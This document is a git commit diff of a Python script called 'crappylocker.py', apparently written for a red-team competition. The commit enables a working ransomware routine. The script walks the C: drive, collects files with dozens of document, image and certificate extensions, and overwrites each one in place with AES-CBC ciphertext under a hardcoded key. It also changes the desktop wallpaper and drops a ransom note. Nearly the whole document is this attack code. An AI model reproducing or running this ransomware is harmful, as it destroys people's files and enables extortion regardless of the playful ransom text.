cc5c546fc977ed1dfb06566dfae71b0dd817bd86
yestoi <yestoi1@gmail.com>
2015-03-28 18:05:42 -0500

    Update crappylocker.py

--- crappylocker.py
+++ crappylocker.py
@@ -1,44 +1,51 @@
-#!/usr/bin/python
-
-import os, fnmatch, ctypes
+import os, fnmatch, ctypes, base64
 from Crypto import Random
-from crypto.cipher import AES
+from Crypto.Cipher import AES
+
+homedir = os.path.expanduser('~')
+
+# Base64 encoded image
+
+image = "base64"
 
 try:
-	homedir = os.path.expanduser('~')
+        f = open(homedir + "\\image.bmp", "w+")
+        f.write(base64.b64decode(image))
+        f.close()
 
-	f = open(homedir + "\\image.bmp", "rb+")
-	f.write(urllib.urlopen("http://www.ece.rice.edu/~wakin/images/lena512.bmp").read())
-	f.close()
+        SPI_SETDESKWALLPAPER = 20
+        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, f.name, 0)
 
-	SPI_SETDESKWALLPAPER = 20
-	ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, f.name, 0)
-	
 except:
-	pass
+        f = open(homedir + "\\Desktop\\Message_From_Redteam.txt", "w+")
+        f.write("""Your files are encrypted.
+                To recover your files, pick one of the following:
 
-'''
+                * Give up 2000 points
+                * Perform the Dougie dance in front of the red team.""")
+        f.close()
+
+
 key = b'\xbf\xc0\x85)\x10nc\x94\x02)j\xdf\xcb\xc4\x94\x9d(\x9e[EX\xc8\xd5\xbfI{\xa2$\x05(\xd5\x18'
-filetypes = ("*.odt","*.ods","*.odp","*.odm","*.odb","*.doc","*.doc","*.doc","*.wps","*.xls","*.xls","*.xls","*.xls","*.xlk","*.ppt","*.ppt","*.ppt","*.mdb","*.acc","*.pst","*.dwg","*.dxf","*.dxg","*.wpd","*.rtf","*.wb","*.mdf","*.dbf","*.psd","*.pdd","*.eps","*.ai","*.ind","*.cdr","*.jpg","*.dng","*.arw","*.srf","*.sr","*.bay","*.crw","*.cr","*.dcr","*.kdc","*.erf","*.mef","*.mrw","*.nef","*.nrw","*.orf","*.raf","*.raw","*.rwl","*.rw","*.ptx","*.pef","*.srw","*.der","*.cer","*.crt","*.pem","*.pfx","*.pdf","*.odc")
+filetypes = ("*.odt","*.ods","*.odp","*.odm","*.odb","*.txt","*.doc","*.doc","*.wps","*.xls","*.xls","*.xls","*.xls","*.xlk","*.ppt","*.ppt","*.ppt","*.mdb","*.acc","*.pst","*.dwg","*.dxf","*.dxg","*.wpd","*.rtf","*.wb","*.mdf","*.dbf","*.psd","*.pdd","*.eps","*.ai","*.ind","*.cdr","*.jpg","*.dng","*.arw","*.srf","*.sr","*.bay","*.crw","*.cr","*.dcr","*.kdc","*.erf","*.mef","*.mrw","*.nef","*.nrw","*.orf","*.raf","*.raw","*.rwl","*.rw","*.ptx","*.pef","*.srw","*.der","*.cer","*.crt","*.pem","*.pfx","*.pdf","*.odc")
 filelist = []
 
 for root, dirnames, filenames in os.walk("C:\\"):
-	for ft in filetypes:
-		for f in fnmatch.filter(filenames, ft):
-			filelist.append(os.path.join(root, f))
+        for ft in filetypes:
+                for f in fnmatch.filter(filenames, ft):
+                        filelist.append(os.path.join(root, f))
 
 for filename in filelist:
-	with open(filename, 'rb+') as f:
-		plaintext = f.read()
+        with open(filename, 'rb+') as f:
+                plaintext = f.read()
 
-		#Pad out the input
-		plaintext = plaintext + b"\0" * (AES.block_size - len(plaintext) % AES.block_size)
-		iv = Random.new().read(AES.block_size)
-		cipher = AES.new(key, AES.MODE_CBC, iv)
-		ciphertext = iv + cipher.encrypt(plaintext)
-	
-		f.seek(0)
-		f.write(ciphertext)
-		f.truncate()
-		f.close()
-'''
+                #Pad out the input
+                plaintext = plaintext + b"\0" * (AES.block_size - len(plaintext) % AES.block_size)
+                iv = Random.new().read(AES.block_size)
+                cipher = AES.new(key, AES.MODE_CBC, iv)
+                ciphertext = iv + cipher.encrypt(plaintext)
+
+                f.seek(0)
+                f.write(ciphertext)
+                f.truncate()
+                f.close()
